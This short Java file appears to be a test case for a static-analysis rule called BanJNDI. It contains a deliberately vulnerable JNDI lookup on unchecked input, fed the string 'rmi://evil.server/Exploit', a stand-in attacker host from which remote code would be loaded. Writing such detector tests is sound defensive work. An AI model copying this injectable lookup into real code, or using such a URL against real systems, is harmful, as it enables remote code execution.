import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    public String showBug(String jndiUrl) throws NamingException {
        Context a = new InitialContext();
        Object b = a.lookup(jndiUrl); // BUG: BanJNDI
        return b.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}